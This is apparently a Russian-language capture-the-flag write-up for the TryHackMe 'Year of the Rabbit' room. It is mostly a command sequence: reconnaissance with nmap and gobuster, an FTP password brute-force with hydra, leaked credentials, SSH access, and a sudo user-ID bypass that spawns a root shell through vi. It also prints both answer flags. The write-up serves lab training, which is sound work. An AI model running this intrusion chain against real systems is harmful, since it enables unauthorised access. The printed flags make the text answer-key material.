[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Year of the Rabbit](https://tryhackme.com/r/room/yearoftherabbit) 

Всего 1 заданиe:
## Задание 1
Давайте приятно и спокойно начнем Новый год!
Сможете ли вы взломать коробку Года Кролика, не провалившись в яму?

(Пожалуйста, убедитесь, что громкость включена!)

### Ответьте на вопросы ниже
Что такое флаг пользователя?
```commandline
nmap -sC -sV 10.10.156.211
gobuster dir -u http://10.10.156.211 -w /usr/share/wordlists/dirb/common.txt
# /assets
# style.css
# /sup3r_s3cr3t_fl4g.php
# /WExYY2Cv-qU
strings Hot_Babe.png > pass.txt
hydra -l ftpuser -P pass.txt ftp://10.10.156.211

ftp 10.10.156.211
# password : 5iez1wGXKfPKQ
ls
get Eli’s_Creds.txt
cat Eli\’s_Creds.txt

# https://www.dcode.fr/brainfuck-language 

ssh eli@10.10.156.211
DSpDiMlwAEwid
locate s3cr3t
cat /usr/games/s3cr3t/.th1s_m3ss4g3_15_f0r_gw3nd0l1n3_0nly!
gwendoline:MniVCQVhQHUNI
su gwendoline
cat user.txt
```
```commandline
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
```
 
Что такое корневой флаг?
```commandline
sudo -l
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
# !/bin/sh
cd /root
ls
cat root.txt
```
```commandline
THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
```
[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)